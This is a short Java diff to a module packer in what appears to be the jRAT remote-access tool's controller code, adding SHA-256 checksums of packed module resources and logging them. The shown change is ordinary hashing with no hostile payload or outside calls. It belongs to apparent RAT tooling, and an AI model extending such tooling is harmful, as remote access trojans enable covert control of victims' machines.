@@ -1,11 +1,13 @@
 package jrat.controller.modules;
 
 import jrat.common.Logger;
+import jrat.common.codec.Hex;
 import jrat.common.compress.QuickLZ;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
+import java.security.MessageDigest;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.jar.JarEntry;
@@ -16,6 +18,7 @@ public class PackedModule extends BaseModuleLoader {
 
     private String mainClass;
     private Map<String, byte[]> packedResources = new HashMap<>();
+    private byte[] sum;
 
     public PackedModule(File file) {
         super(file);
@@ -37,6 +40,8 @@ public class PackedModule extends BaseModuleLoader {
         this.mainClass = mf.getMainAttributes().getValue("Main-Class");
 
         Logger.log("packing " + file.getName());
+
+        MessageDigest digest = MessageDigest.getInstance("SHA-256");
 
         JarEntry entry;
         while ((entry = jis.getNextJarEntry()) != null) {
@@ -60,6 +65,8 @@ public class PackedModule extends BaseModuleLoader {
 
             byte[] array = out.toByteArray();
 
+            digest.update(array);
+
             int uncompressedSize = array.length;
             totalUncompressed += array.length;
 
@@ -71,7 +78,10 @@ public class PackedModule extends BaseModuleLoader {
         }
         jis.close();
 
+        this.sum = digest.digest();
+
         Logger.log("\ttotal: " + total + " bytes (" + (((float) total / (float) totalUncompressed) * 100f) + "%)");
+        Logger.log("sha256: " + Hex.encode(this.sum));
     }
 
     public String getMainClass() {
@@ -80,5 +90,9 @@ public class PackedModule extends BaseModuleLoader {
 
     public Map<String, byte[]> getPackedResources() {
         return this.packedResources;
+    }
+
+    public byte[] getSum() {
+        return this.sum;
     }
 }
